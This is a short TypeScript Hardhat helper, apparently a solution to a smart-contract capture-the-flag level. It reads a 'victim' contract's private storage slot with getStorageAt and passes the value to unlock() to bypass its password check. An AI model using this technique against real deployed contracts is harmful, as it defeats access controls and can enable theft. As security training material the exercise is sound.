import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const hexStr = await ethers.provider.getStorageAt(victim.address, 1);
  const tx = await victim.unlock(hexStr);
  await tx.wait();
};

export default helper;
